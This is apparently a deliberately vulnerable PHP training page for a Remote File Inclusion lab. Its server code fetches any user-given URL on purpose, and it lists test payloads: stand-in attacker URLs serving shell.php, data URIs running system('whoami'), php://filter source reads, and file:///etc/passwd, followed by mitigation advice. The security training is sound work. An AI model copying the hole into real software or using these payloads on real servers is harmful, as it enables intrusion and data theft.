<?php
// Lab 1: Basic RFI Attack
// Vulnerability: Remote File Inclusion without proper validation

session_start();

$message = '';
$included_content = '';
$user_input = '';

// Simulate file inclusion (vulnerable to RFI)
function include_file($filename) {
    // Vulnerable: Direct inclusion without validation
    if (empty($filename)) {
        return "No file specified.";
    }
    
    // Check if it's a remote URL
    if (filter_var($filename, FILTER_VALIDATE_URL)) {
        // Vulnerable: Direct inclusion of remote files
        $content = @file_get_contents($filename);
        if ($content !== false) {
            return $content;
        } else {
            return "Failed to include remote file: " . htmlspecialchars($filename);
        }
    }
    
    // Local file inclusion
    $local_path = "includes/" . basename($filename);
    if (file_exists($local_path)) {
        return file_get_contents($local_path);
    } else {
        return "Local file not found: " . htmlspecialchars($local_path);
    }
}

// Handle file inclusion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['include_file'])) {
    $user_input = $_POST['filename'] ?? '';
    
    if ($user_input) {
        $included_content = include_file($user_input);
        
        if (strpos($included_content, 'Failed to include remote file') !== false) {
            $message = '<div class="alert alert-danger">Failed to include remote file!</div>';
        } elseif (strpos($included_content, 'Local file not found') !== false) {
            $message = '<div class="alert alert-warning">Local file not found!</div>';
        } else {
            $message = '<div class="alert alert-success">File included successfully!</div>';
        }
    }
}

// Create some sample local files for testing
if (!file_exists('includes')) {
    mkdir('includes', 0755, true);
}

// Create sample files
$sample_files = [
    'welcome.txt' => 'Welcome to our application!',
    'about.txt' => 'This is a sample about page.',
    'contact.txt' => 'Contact us at: contact@example.com',
    'config.txt' => 'Database configuration: localhost:3306'
];

foreach ($sample_files as $filename => $content) {
    $file_path = 'includes/' . $filename;
    if (!file_exists($file_path)) {
        file_put_contents($file_path, $content);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic RFI Attack - RFI Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .included-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .file-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to RFI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic RFI Attack</h1>
            <p class="hero-subtitle">Remote File Inclusion without proper validation</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic RFI vulnerability where user input is directly used in file inclusion functions without proper validation. The application allows inclusion of both local and remote files.</p>
            <p><strong>Objective:</strong> Include remote files to achieve code execution and information disclosure.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct inclusion without validation
function include_file($filename) {
    if (empty($filename)) {
        return "No file specified.";
    }
    
    // Check if it's a remote URL
    if (filter_var($filename, FILTER_VALIDATE_URL)) {
        // Vulnerable: Direct inclusion of remote files
        $content = @file_get_contents($filename);
        if ($content !== false) {
            return $content;
        }
    }
    
    // Local file inclusion
    $local_path = "includes/" . basename($filename);
    if (file_exists($local_path)) {
        return file_get_contents($local_path);
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-file-earmark me-2"></i>File Inclusion Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="file-info">
                            <h5>Available Local Files</h5>
                            <ul>
                                <li><code>welcome.txt</code> - Welcome message</li>
                                <li><code>about.txt</code> - About page</li>
                                <li><code>contact.txt</code> - Contact information</li>
                                <li><code>config.txt</code> - Configuration file</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="include_file" value="1">
                            <div class="mb-3">
                                <label for="filename" class="form-label">File to Include</label>
                                <input type="text" class="form-control" id="filename" name="filename" 
                                       placeholder="Enter filename or URL..." value="<?php echo htmlspecialchars($user_input); ?>">
                            </div>
                            <button type="submit" class="btn btn-primary">Include File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($included_content): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-file-earmark me-2"></i>Included Content
                    </div>
                    <div class="card-body">
                        <div class="included-display">
                            <h5>File Content</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($included_content); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Remote File Inclusion (RFI)</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct inclusion of remote files</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <ul>
                        <li><code>welcome.txt</code> - Local file</li>
                        <li><code>http://attacker.com/shell.php</code> - Remote file</li>
                        <li><code>https://pastebin.com/raw/abc123</code> - Remote content</li>
                        <li><code>ftp://attacker.com/shell.php</code> - FTP file</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>RFI Test Payloads</h5>
            <p>Use these payloads to test the RFI vulnerability:</p>
            
            <h6>1. Local File Inclusion:</h6>
            <div class="code-block">welcome.txt
about.txt
contact.txt
config.txt</div>

            <h6>2. Remote File Inclusion (HTTP):</h6>
            <div class="code-block">http://attacker.com/shell.php
https://pastebin.com/raw/abc123
http://evil.com/malicious.txt
https://raw.githubusercontent.com/attacker/shell.php</div>

            <h6>3. Remote File Inclusion (FTP):</h6>
            <div class="code-block">ftp://attacker.com/shell.php
ftp://user:pass@evil.com/malicious.txt
ftp://anonymous@attacker.com/shell.php</div>

            <h6>4. Remote File Inclusion (Data URI):</h6>
            <div class="code-block">data:text/plain,<?php echo "Hacked!"; ?>
data:text/plain,<?php system('whoami'); ?>
data:text/plain,<?php phpinfo(); ?></div>

            <h6>5. Remote File Inclusion (PHP Wrapper):</h6>
            <div class="code-block">php://input
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php</div>

            <h6>6. Remote File Inclusion (Other Protocols):</h6>
            <div class="code-block">file:///etc/passwd
file:///etc/hosts
file:///proc/version
file:///proc/cpuinfo</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Include remote malicious files and execute arbitrary code</li>
                <li>Access sensitive local files using file:// protocol</li>
                <li>Bypass authentication and authorization mechanisms</li>
                <li>Data exfiltration and sensitive information disclosure</li>
                <li>Server compromise and lateral movement</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Disable remote file inclusion in PHP configuration</li>
                    <li>Use whitelist-based file inclusion validation</li>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use safe file inclusion functions and methods</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file inclusion patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
